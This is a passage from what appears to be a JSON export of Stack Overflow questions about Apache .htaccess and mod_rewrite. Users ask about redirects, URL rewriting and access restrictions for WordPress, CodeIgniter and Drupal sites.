  Options +FollowSymlinks\n   RewriteEngine on\n   rewritecond %{http_host} ^host [nc]\n   rewriterule ^(.*)$ http://host.domain.com/$1 [r=301,nc]`\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1440,"score":1,"question_id":6295141,"title":"Server not parsing .html as PHP","body":"<p>I have the included code in my .htaccess file but the php code I am attempting to include is not working.</p>\n\n<pre><code>Options +Includes\nAddType text/html  .htm .html\nAddHandler server-parsed .htm .html\nAddType application/octet-stream .vcf\nAddOutputFilterByType DEFLATE text/html text/htm text/plain text/css text/php    text/javascript application/x-javascript\n</code></pre>\n"},{"tags":[".htaccess","rewrite","ckeditor","cakephp-2.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12987702,"title":"CKEditor auto-created path is wrong on server using rewrite.script files","body":"<p>I have built a website in CakePHP 2.0, and uploaded it to a webserver which doesn't use .htaccess files - instead I have to use rewrite.script files.  This works fine, except for the CKEditor, which seems to generate its own, incorrect, path.</p>\n\n<p>When I include CKEditor, it auto-generates 3 paths in the  section.  In this case, these are:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"http://mysite.com/js/ckeditor/config.js?t=B8DJ5M3\"&gt;&lt;/script&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://mysite.com/js/ckeditor/skins/kama/editor.css?t=B8DJ5M3\"&gt;\n&lt;script type=\"text/javascript\" src=\"http://mysite.com/js/ckeditor/lang/en.js?t=B8DJ5M3\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>When using .htaccess files, Cake would know that it needed to look in 'webroot' for the 'js' folder, but the rewrite.script files don't seem to pick up on that.</p>\n\n<p>So, I think my question is, how do I get rewrite.script files to automatically look in webroot in cases like this?  Or does anyone have any other ideas about what might be going on here?  For instance, can I force CKEditor to generate different urls (containing 'app/webroot')?</p>\n\n<p>Thanks for any help!</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5531,"score":4,"question_id":1157255,"title":"How to redirect non-www to www URL's using htaccess?","body":"<p>I have a website say <a href=\"http://www.example.com/\" rel=\"nofollow\">http://www.example.com/</a> in the root of my website, I have added .htaccess file to redirect any request of <a href=\"http://example.com/\" rel=\"nofollow\">http://example.com/</a> to <a href=\"http://www.example.com/\" rel=\"nofollow\">http://www.example.com/</a></p>\n\n<p>Recently I have created a new section \"Videos\" so the URL for videos is <a href=\"http://www.example.com/videos/\" rel=\"nofollow\">http://www.example.com/videos/</a> . In this video folder I have another htaccess file which is performing rewriting for video entries. When I am trying to access <a href=\"http://example.com/videos/\" rel=\"nofollow\">http://example.com/videos/</a> then its not redirecting me to <a href=\"http://www.example.com/videos/\" rel=\"nofollow\">http://www.example.com/videos/</a></p>\n\n<p>I think .htacces is not inheriting the previous rules from the parent directory. Can anyone please tell me what can be the rule I can add in the .htaccess file of /videos/ folder so that any request for <a href=\"http://example.com/videos/\" rel=\"nofollow\">http://example.com/videos/</a> will be redirected to <a href=\"http://www.example.com/videos/\" rel=\"nofollow\">http://www.example.com/videos/</a> URL.</p>\n"},{"tags":[".htaccess","url","bootstrap","kohana-3.2"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12259359,"title":"how to rewrite url's as proper SEO url in kohana 3.2?","body":"<p>I'm using kohana3.2. i want to rewrite the url's in t o proper SEO url's. For ex,\nmy url is now <a href=\"http://samplesite.com/user/register/\" rel=\"nofollow\">http://samplesite.com/user/register/</a> . but i want my url as <a href=\"http://samplesite.com/register.html\" rel=\"nofollow\">http://samplesite.com/register.html</a>.</p>\n\n<p>In 2.3.4 version of kohana , in routes file (application/config/routes.php) we will do the changes .. </p>\n\n<p>How to do it in kohana 3.2??</p>\n\n<p>Thanks in advance..</p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12947190,"title":"htaccess 301 redirect everything except /admin","body":"<p>I have been scratching my head for almost half an hour already because of this. I don't know what I am doing wrong, might just be under my nose, but i just cant see it. Here's what I have on my <code>.htaccess</code></p>\n\n<pre><code>  RewriteCond %{HTTP_HOST} ^example\\.com$ [NC]\n  RewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]\n\n  RewriteCond %{HTTP_HOST} ^www\\.example\\.com$ [NC]\n  RewriteCond %{REQUEST_URI} !^/admin [NC]\n  RewriteRule ^(.*)$ http://newsite.com/$1 [R=301,L]\n</code></pre>\n\n<p>When I access <code>example.com/admin</code>, i am still redirected to <code>newsite.com/admin</code>.\nCan anyone please advise? Thanks!</p>\n\n<p>UPDATE: This is my everything that I have on mod_rewrite currently:</p>\n\n<pre><code>  RewriteRule ^googleabcdef12345.html - [L] \n  RewriteCond %{HTTP_HOST} ^sample1\\.no$ [NC]\n  RewriteRule ^(.*)$ http://www.newsample1.no/$1 [L,R=301]\n\n  RewriteCond %{HTTP_HOST} example\\.com$ [NC]\n  #RewriteRule admin - [S=1]\n  RewriteRule ^(.*)$ http://newsite.com/$1 [R=301,L]\n\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n</code></pre>\n\n<p>It is a drupal website btw. I tried QUERY_STRING instead of REQUEST_URI but no luck still.</p>\n"},{"tags":["php","html","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12986037,"title":"Broken Links .htaccess issue","body":"<p>I checked my WordPress theme on broken link checker website and its giving me a list of broken URLs.</p>\n\n<p>See:</p>\n\n<pre><code>http://www.esmedicare.com/locations.html ( parent page: http://www.esmedicare.com/ )\nhttp://www.esmedicare.com/laser-treatments/locations.html ( parent page: http://www.esmedicare.com/laser-treatments/ )\n</code></pre>\n\n<p>The links with /location.html goes to 404 page and I want to redirect these pages to their parents page. i.e. Just remove the /location.html from URL and to redirect these to their parent URL mentioned in the bracker.</p>\n\n<p>I added code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)/locations.html$ /$1/ [L,R=301]\n</code></pre>\n\n<p>to my .htaccess file, now some <code>/location.html</code> pages are redirecting to their parent page but still not all of them.</p>\n\n<p>Please solve my issue...I just want to remove the <code>/location.html</code> from last in the URL.</p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite","https"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12958906,"title":"Redirect to https for certain url only for wordpress site","body":"<p>I'm working on a wordpress site. And just installed SSL. It has been installed correctly but I want to redirect visitors to the https url for certain pages only. I also want to force browser to use http for other pages.</p>\n\n<p>I know this can be done with .htaccess and tried several things as well. But unable to get this as I need. I'm a novice at handling .haccess rewrite rules and can't find the docs that can guide me.</p>\n\n<p>For example, I need to force browser to use https for this two urls:\n<code>http://www.example.com/sells/payment/</code>\n<code>http://www.example.com/customer/login/</code></p>\n\n<p>and for all other urls to just use normal http forcefully. What kind of rules I need to write?</p>\n\n<p><strong>Update 1</strong></p>\n\n<p>I also have a rule that redirects non-www url to a www url, and that might be conflicting with these rules. Here is how I redirect all non-www urls to www urls. </p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^example\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L]\n</code></pre>\n\n<p>The issue I'm facing is, after applying https rules, it is redirected to <a href=\"https://www.www.example.com/sells/payment/\" rel=\"nofollow\">https://www.www.example.com/sells/payment/</a> which is a wrong url.</p>\n\n<p>Any idea for fixing this?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12985793,"title":"I need my .htaccess file to redirect all <any_name>.php to <same_name>.html except for index.php","body":"<p>I need an .htaccess rewrite rule that will redirect links like this:</p>\n\n<ul>\n<li>www.mydomain.com/viewpressrelease.php</li>\n<li>www.mydomain.com/viewpressrelease.php?id=17 (or any text follwing .php)</li>\n<li>www.mydomain.com/employment.php</li>\n</ul>\n\n<p>to links with the same name replacing .php to .html like this:</p>\n\n<ul>\n<li>www.mydomain.com/viewpressrelease.html</li>\n<li>www.mydomain.com/employment.html</li>\n</ul>\n\n<p>but not act on the index.php or the following:</p>\n\n<ul>\n<li>www.mydomain.com/administrator/index.php</li>\n</ul>\n\n<p>I have an example that is close but does not handle ?id=17 part and is making index.php into index.html.</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^[A-Z]+\\s([^\\s]+)\\.php\\s \nRewriteRule .* %1.html [R=301,L] \nRewriteRule ^(.*)\\.html$ $1.php\n</code></pre>\n\n<p>What do I need to make this work as desired?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","hotlinking"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1573,"score":0,"question_id":10236717,"title":"(htaccess) How to prevent a file from DIRECT URL ACCESS?","body":"<p><em>This is my second post for the same problem. Coz the previous post needed some more example.</em></p>\n\n<p>Ok lets say again, i'm using Apache and i have a sample web folder (on my Localhost) like:</p>\n\n<ul>\n<li><a href=\"http://localhost/test/\" rel=\"nofollow\">http://localhost/test/</a></li>\n</ul>\n\n<p>In the folder, the files will be:</p>\n\n<ul>\n<li>index.html</li>\n<li>sample.jpg</li>\n<li>.htaccess</li>\n</ul>\n\n<p>The \"index.html\" will simply include:</p>\n\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n    &lt;img src=\"sample.jpg\" /&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>When i run the website at <code>http://localhost/test/</code>, there will be simply showing the image `sample.jpg' on the page.</p>\n\n<p><strong>THEN THE PROBLEM HERE IS</strong>:</p>\n\n<ul>\n<li>I want to prevent the image showing as <code>http://localhost/test/sample.jpg</code> directly in the url bar.</li>\n</ul>\n\n<p><em>Note:<br>\nAfter one day of getting below answers, i found all solutions logically work, but problem with Firefox. I mean, the below answers are giving the solution while testing on every browser but not with Firefox.</em></p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12985501,"title":"how to change a website available only for admin","body":"<p>i have a website that need to be unavailable for public.\nI cannot test my website locally because lot of contents are depend on databases and images.</p>\n\n<p>At present i am using <strong>.htaccess</strong>  to deny all the people,bots and allow my ip address to use the site. What happens i have a <strong>dial-up ADSL modem</strong> and my ISP connection is frequently disconnecting. So i need to change the allowed IP address in htaccess frequently.This is terrible.</p>\n\n<p>Is there any other way to overcome this situation. I saw an article to make the site password protected. is it okay or what should i do to overcome this terrible scenario.<br>\nThanks</p>\n"},{"tags":[".htaccess","codeigniter","redirect","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12983761,"title":"Codeigniter issue - remove trailing slashes, redirect other non-permitted URI characters to a 404 page","body":"<p>I have recently added the following to .htaccess to remove trailing slashes:  </p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n</code></pre>\n\n<p>I also extend CI_URI to remove non-permitted URI chars and redirect to a 404 page (thankyou to whoever was the original author, not me!):</p>\n\n<pre><code>public function _filter_uri($str)\n{\nif ($str != '' &amp;&amp; $this-&gt;config-&gt;item('permitted_uri_chars') != '' &amp;&amp; $this-&gt;config-&gt;item('enable_query_strings') == FALSE)\n{\n// preg_quote() in PHP 5.3 escapes -, so the str_replace() and addition of - to   preg_quote() is to maintain backwards\n// compatibility as many are unaware of how characters in the permitted_uri_chars will be parsed as a regex pattern\nif ( ! preg_match('|^['.str_replace(array('\\\\-', '\\-'), '-', preg_quote($this-&gt;config-&gt;item('permitted_uri_chars'), '-')).']+$|i', $str))\n{\nshow_404(); //show 404 error page instead \"The URI you submitted has disallowed characters\" error\n}\n}\n\n// Convert programatic characters to entities and return\nreturn str_replace(\narray('$',     '(',     ')',     '%28',   '%29'),\n// Bad\narray('&amp;#36;', '&amp;#40;', '&amp;#41;', '&amp;#40;', '&amp;#41;'),\n// Good\n$str);\n}\n}\n</code></pre>\n\n<p>Since I added the .htaccess code, any disallowed characters in the URI e.g. <a href=\"http://www.mysite.com/contro,ller/func,tion\" rel=\"nofollow\">http://www.mysite.com/contro,ller/func,tion</a> (with commas) result in a redirect to a 301 page, with a subsequent link to a 404 error page (i.e. \"The page has moved here\" with a link to my standard 404 page).</p>\n\n<p>Can I get both to work together, so disallowed chars are just redirected to my standard 404 page?</p>\n"},{"tags":["php","apache",".htaccess","url","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12984318,"title":"Remove file extension AND allow \"pseudo directories\"?","body":"<p>I'm creating a fairly simple website. There are two static pages (Home and Portfolio) in the root folder, and Wordpress in <code>/blog</code>. The static pages includes Wordpress using <code>require_once(\"blog/wp-config.php\");</code>.</p>\n\n<p>The portfolio page will be using Javascript (either History.JS or Crossroads/Hasher) to \"push\" URLs representing the categories and albums. For example, clicking \"Weddings\" on the left will result in <code>portfolio/weddings</code>, and an album would be <code>portfolio/weddings/jane-jon-smith</code>. These files need to be available when accessed directly (I send you a link to the album).</p>\n\n<p>Right now, I have it set up so that the static pages are accessible from <code>index.php</code> and <code>portfolio.php</code>. I was able to remove the file extensions using the following .htaccess directives:</p>\n\n<pre><code># Remove .php-extension from url\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([^\\.]+)/$ $1.php [L]\n</code></pre>\n\n<p>But when I try to visit a URL such as <code>portfolio/weddings</code>, I get a 404 error because that isn't a valid directory or file. I've been searching, but can't seem to find anything related, other than how to remove the extension (which I have working).</p>\n\n<p>How do I remove the file extension and also allow direct access to these \"fake\" directories?</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12976230,"title":"A better way to do this htaccess rewrite rule","body":"<p>I have this rewrite rule that checks for a country code in the url and fetches content accordingly.</p>\n\n<p>Problem is there are 60+ countries. Can this be done in a different way rather than entering codes of all the countries in the rule?</p>\n\n<pre><code>RewriteRule ^/?(us|uk|ca)/p([0-9]+)/?$\n</code></pre>\n\n<p>Note the (us|uk|ca) part? A whole lot more need to go in there. Any better way to do this?</p>\n"},{"tags":["html","apache",".htaccess","website"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12982904,"title":"How did this website do their splash page/age verification?","body":"<p>I am looking at this website - <a href=\"http://www.shopmss.com/\" rel=\"nofollow\">http://www.shopmss.com/</a> - and I was wondering how they did the splash page, age verification and store all on the same URL 'shopmss.com'. You click through 3 screens before you get back to the store. </p>\n\n<p>My secondary question is, can you do this without setting a cookie? i.e. Javascript, that appends the browser bar URL? Or something with <code>mod_rewrite</code>?</p>\n\n<p>EDIT: I thought this was a relevant question to ask because I was exploring the best practice to accomplish the task, I figured it would have something technical. My bad.</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":277,"score":0,"question_id":7999738,"title":"HTAccess in PHPPennyAuction","body":"<p>I've just had a problem from last few hours. For a client I needed to redirect some urls to other specific urls through his .htaccess files. I just went through his ftp from Filezilla as he has cloud hosting, there wasn't any cpanel. I just had a .htaccess file which contains only 301 redirects, I uploaded it into /content folder.. Then I opened the site and saw it dead, before it it was working fine. Now whenever I open the site I receive this</p>\n\n<pre><code>Upgrade in progress.\n\n    Copy changes to updated version(complete 4:45)\n    Copy settings to updated version(complete 5:00)\n    Back up whole site.(complete 6:44)\n    Back up the database(complete 6:45)\n    Upgrade database(complete 6:49)\n    Upload new code\n</code></pre>\n\n<p>If I try to go to /index.php I receive this.</p>\n\n<pre><code>phpPennyAuction\nphpPennyAuction is not yet completely installed.\n\nPlease check the following:\n\n    That both of your .htaccess files are present and correct.\n    That your server has mod_rewrite installed\n    That your server is configured with AllowOverride set to All\n\nIf you need further assistance, please contact phpPennyAuction Support.\nAll contents © 2010 Scriptmatix Ltd. phpPennyAuction\n</code></pre>\n\n<p>Before just putting .htaccess file everything was fine. I just removed my .htaccess file, renamed the cache folder still the same problem. I might pay a little cup of coffee to anyone who helps fixing in this. </p>\n\n<p>P.S Don't advise to ask on their forum, just contact their support the guy unofficially said \"I'm not sure what's the problem I will charge 300 USD\".</p>\n\n<p>It is a big trouble for me, help appreciated.</p>\n\n<p>Thanks\nKazim</p>\n"},{"tags":["php","regex",".htaccess","url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12983475,"title":"Using .htaccess RewriteRule to interpret multiple $_GET variables","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/6814977/mod-rewrite-and-using-phps-get-for-urls-when-not-following-the-rules\">Mod Rewrite and Using PHP’s GET for URL’s When not Following the Rules</a>  </p>\n</blockquote>\n\n\n\n<p>I've been scratching my head over this for days... I have a instance where a URL needs to pass different variables on a <code>$_GET</code> string.</p>\n\n<p>I'm looking to parse the following URL:</p>\n\n<pre><code>http://www.domain.com/1/count/?var1=a&amp;var2=b\n</code></pre>\n\n<p>Basically, I need to parse <em><code>count</code></em> as a <code>$_GET['var3']</code> variable along with other additional vars appended after the trailing slash (<em><code>?var1=a&amp;var2=b</code></em>).</p>\n\n<p>I've tried the following along with many other options, but it results in a 404:</p>\n\n<pre><code>RewriteRule ^1/(count|list|detail)$/$ /1/service.php?method=$1\nRewriteRule ^1/(count|list|detail)$/$ /1/service.php?method=$1&amp;$2?\n</code></pre>\n\n<p>I've scoured many docs and answers, but I can't find an applicable answer and admit, it's driving me slowly insane!</p>\n\n<p>Any help would be graciously accepted and appreciated.</p>\n"},{"tags":[".htaccess","conflict"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12973979,"title":"htaccess conflict","body":"<p>I have this problem because im not experienced in htaccess:</p>\n\n<ol>\n<li><code>RewriteRule ^premium-vectors/([^/]*)\\.html$ /index.php?saudio=$1 [L]</code></li>\n<li><code>RewriteRule ^premium-vectors\\.html$ /premium-vectors/1.html [L]</code></li>\n<li><code>RewriteRule ^premium-vectors\\/([0-9a-z-]+).html$ index.php?catalog=$1&amp;ctypes=audio [L]</code></li>\n</ol>\n\n<p>No. 1 is content list, all vectors in one page\nNo. 3 is only one vector</p>\n\n<p>So I would like to show:</p>\n\n<ul>\n<li>No. 1 www.web.com/premium-vectors.html </li>\n<li>No. 3  www.web.com/premium-vectors/name-of-vector.html</li>\n</ul>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12976252,"title":"Mod Rewrite same format, different source","body":"<p>Currently doing some URL rewriting for a company and I'm struggling to get the new URLs to point to the correct files.</p>\n\n<p>I do not have access to the CMS - the pages are generated in two formats:</p>\n\n<ul>\n<li>website.com/pressReleases.php?lang=EN</li>\n<li>website.com/page.php?pagename=About&amp;lang=EN</li>\n</ul>\n\n<p>I have used rewriting for each format to make them into the same required format (website.com/language/pagename):</p>\n\n<p><strong>Format 1 (website.com/pressReleases.php)</strong></p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^lang=(.*)$\nRewriteRule ^(.*).php$ /%1/$1? [L]\n</code></pre>\n\n<p><strong>Format 2 (website.com/page.php?pagename=About&amp;lang=EN)</strong></p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^(GET|HEAD)\\ /page.php\nRewriteCond %{QUERY_STRING} pagename=([^&amp;]+)&amp;lang=([^&amp;]+)\nRewriteRule ^page.php$ /%2/%1? [R=301,L]\n</code></pre>\n\n<p>The problem is that the output of the two format rewrites is the same, but the source files/path are different. When I create another redirect to forward the nice URLs to the actual source it applies to both:</p>\n\n<pre><code>RewriteRule ^([A-Za-z]+)/([0-9]+)/([a-zA-Z0-9_-]+)$ productSelection.php?    groupid=$2&amp;lang=$1 [L]\n</code></pre>\n\n<p>Is there any way I can use the same nice format for both URL types, but forward to their original paths? Have I structured my rewrites incorrectly that is preventing this?</p>\n\n<p>Any help much appreciated!</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12979642,"title":"Getting rid of index.php in codeigniter with Vhost","body":"<p>I've tried every possible htaccess snippet I could find about this but none will work. My codeigniter projects is found on ci.mydomain.com and I've configured the virtualhost this way</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    ServerName ci.mydomain.com\n    ServerAlias ci.mydomain.com\n    ServerAdmin x@gmail.com\n    DocumentRoot /var/www/codeigniter\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I've also set </p>\n\n<pre><code>$config['index_page'] = '';\n</code></pre>\n\n<p>I just get 404. What's wrong?\nI'm using the latest version 2.1.3</p>\n\n<p><strong>Update</strong></p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    RewriteEngine on\n    RewriteCond $1 !^(index\\.php|images|robots\\.txt)\n    RewriteRule ^(.*)$ /index.php/$1 [PT]\n    ServerName ci.domain.com\n    ServerAlias ci.domain.com\n    ServerAdmin d@d.com\n    DocumentRoot /var/www/codeigniter\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I tried this and it worked for me. Although I would rather use a .htaccess file.</p>\n\n<p>Edit: Guys, the reason I mentioned that I use virtual host is that i suspect that is what causes the problem. But maybe I'm wrong.</p>\n"},{"tags":[".htaccess","redirect","indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":23,"score":-1,"question_id":12980519,"title":"google redirecting all search results to my homepage","body":"<p>I have created an .htaccess file with the following code:</p>\n\n<pre><code>rewriteengine on\nrewritecond %{HTTP_HOST} ^example.com$\nrewriterule ^hie\\/ \"http\\:\\/\\/www\\.example\\.com\\/\" [R=301,L] #5060c69211a2d\nErrorDocument 404 http://www.example.com/redirect.html\n</code></pre>\n\n<p>Google, for some reason, is redirecting all of my pages that come up in search results to my homepage. </p>\n\n<p>I'm not sure why this is happening, bing and yahoo search results work fine. I realize that google has the link to my page as \"example.com/siding/example.html\" NOT \"www.example.com/siding/example.html\". </p>\n\n<p>I have no idea why and no idea how to fix it. Any ideas? </p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12976752,"title":"rewrite rule base on first sub domain to directory","body":"<p>I need to redirect the first sub domain of any domain name that will hit the root folder of that web server to a subfolder.</p>\n\n<ul>\n<li>It need to keep the incoming port (stupid isp that block port 80 and 443).</li>\n<li>It need to be able to handle both http and https.</li>\n<li>It need to ignore www.whateverthedomain.ext</li>\n</ul>\n\n<p>Ex.</p>\n\n<ul>\n<li>dom1 : mydummy.com</li>\n<li>dom2 : toberedirected.net</li>\n<li>dom3 : putanydomainhere.ca</li>\n</ul>\n\n<p>possible incoming url</p>\n\n<ol>\n<li>http(s)://firstsub.mydummy.com:8082</li>\n<li>http(s)://whateveryoutypehere.thegoodsub.toberedirected.net</li>\n<li>http(s)://firstsub.mydummy.com/firstsub/</li>\n<li>http(s)://www.mydummy.com/</li>\n</ol>\n\n<p>The result of the 3 incoming url should be</p>\n\n<ol>\n<li>http(s)://firstsub.mydummy.com:8082/firstsub/</li>\n<li>http(s)://thegoodsub.toberedirected.net/thegoodsub/ (i dont care what is in front of the first sub)</li>\n<li>http(s)://firstsub.mydummy.com/firstsub/ (dont rewrite, it is not the root folder)</li>\n<li>http(s)://www.mydummy.com/ (dont rewrite, ignore www and give default webpage of the domain)</li>\n</ol>\n\n<p>It is probably easy to write but i cannot figure it out this morning.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":37,"score":0,"question_id":12978331,"title":"Redirect main domain Will effect subdomain in Old Domain htaccess","body":"<p>If I Redirect Olddomain.com to Newdomain.com just main Domain using Htaccess\nis this redirect will effect on subdomain in Olddomain ?\nI will not Redirect Old Subdomains to new Domain</p>\n"},{"tags":["wordpress",".htaccess","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12980637,"title":"301 Redirects working for hidden index.php but not for <file>.php","body":"<p>I am moving a client from a custom developed PHP site to Wordpress. I am now in the process of using 301 Redirects in the .htaccess file to move the old locations to the new ones in Wordpress.  Some of them are working and some not (meaning it serves up the \"old\" location). I have the standard \"pretty permalinks\" mod_rewrite section in the file and then all the 301's. </p>\n\n<p>So, the ones that have an original location that are listed like a directory (re-written index.php) work and the ones that have an explicitly named php file do not. Examples:</p>\n\n<p>This works:</p>\n\n<pre><code>Redirect 301 /about/ http://deanchiropractic.com/about-us/\n</code></pre>\n\n<p>This does (still serves dr-jon.php):</p>\n\n<pre><code>Redirect 301 /about/dr-jon.php http://deanchiropractic.com/about-us/dr-jon-dean/\n</code></pre>\n\n<p>I have tried changing the order around, tried having the 301s before and after the mod-rewrite section, tried with and without a DirectoryIndex line.  I've also verified that i am editing the .htaccess in the webserver root.</p>\n\n<p>I'd rather get my .htaccess working than put php to do the 301 Redirects in all the files that aren't redirecting (I have tried, and verified that using one file).</p>\n\n<p>Here is the entire thing for reference:</p>\n\n<pre><code>DirectoryIndex index.php index.html\nRedirect 301 /about/dr-dean.php http://deanchiropractic.com/about-us/christophe-dean-dc/\nRedirect 301 /about/dr-jon.php http://deanchiropractic.com/about-us/dr-jon-dean/\nRedirect 301 /techniques/activator.php http://deanchiropractic.com/chiropractic-techniques/activator-method/\nRedirect 301 /techniques/cox-technique.php http://deanchiropractic.com/chiropractic-techniques/cox-technique/\nRedirect 301 /techniques/active-release.php http://deanchiropractic.com/chiropractic-techniques/active-release-technique/\nRedirect 301 /community/dinner-talk.php http://deanchiropractic.com/get-healthy/\nRedirect 301 /community/refer.php http://deanchiropractic.com/get-healthy/\nRedirect 301 /resources/forms.php http://deanchiropractic.com/forms/\nRedirect 301 /resources/faq.php http://deanchiropractic.com/faq/\nRedirect 301 /resources/articles/low-back-pain-relief.php http://deanchiropractic.com/low-back-pain-relief/\nRedirect 301 /resources/articles/about-the-activator-method.php http://deanchiropractic.com/achieve-wellness-with-the-activator-method/\nRedirect 301 /resources/articles/spinal-disc-treatment.php http://deanchiropractic.com/spinal-disc-treatment/\nRedirect 301 /resources/articles/headache-relief-benefits.php http://deanchiropractic.com/headache-relief/\nRedirect 301 /resources/articles/carpal-tunnel-relief.php http://deanchiropractic.com/carpal-tunnel-relief/\nRedirect 301 /resources/articles/neck-pain-relief.php http://deanchiropractic.com/neck-pain-relief/\nRedirect 301 /testimonials.php http://deanchiropractic.com/reviews/\nRedirect 301 /contact.php http://deanchiropractic.com/contact-us/\nRedirect 301 /about/    http://deanchiropractic.com/about-us/\nRedirect 301 /techniques/   http://deanchiropractic.com/chiropractic-techniques/\nRedirect 301 /community/    http://deanchiropractic.com/get-healthy/\nRedirect 301 /resources/    http://deanchiropractic.com/forms/\nRedirect 301 /resources/articles/   http://deanchiropractic.com/category/articles/\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>I've searched wide, and on this site and can't find a match for my exact problem...though I've learned a lot about .htaccess in the process (still a n00b tho).  Thanks....</p>\n"},{"tags":["php","html","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12981947,"title":"Redirecting URL using .htaccess","body":"<p>I have a WordPress website and some link checker plugins are reporting all the links broken in same way. Just have a look:</p>\n\n<pre><code>http://www.esmedicare.com/category/blog/page/2/locations.html ( parent page: http://www.esmedicare.com/category/blog/page/2/ )\nhttp://www.esmedicare.com/hello-world/locations.html ( parent page: http://www.esmedicare.com/hello-world/ )\nhttp://www.esmedicare.com/neonatal-care-2/locations.html ( parent page: http://www.esmedicare.com/neonatal-care-2/ )\nhttp://www.esmedicare.com/dental-center/locations.html ( parent page: http://www.esmedicare.com/dental-center/\n</code></pre>\n\n<p>I just want to redirect all these pages to their parent pages shown in bracket but I dont know how to do it exactly.</p>\n\n<p>Please help me to solve this.</p>\n"},{"tags":["java",".htaccess","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":251,"score":4,"question_id":12849187,"title":"How to prevent \"Authentication Required\" box from coming up?","body":"<p>I have a Java applet that is being included on a page in a directory that is password protected through a .htaccess file. When browses to pages in this directory I naturally have to authenticate at the beginning of a new session, but the problem is that this Java \"Authentication Required\" box is popping up on every page load.</p>\n\n<p>I thought that maybe putting the applet outside of the password protected directory might fix the problem, but no joy.</p>\n\n<p>Any idea what can be done to prevent the \"Authentication Required\" box from coming 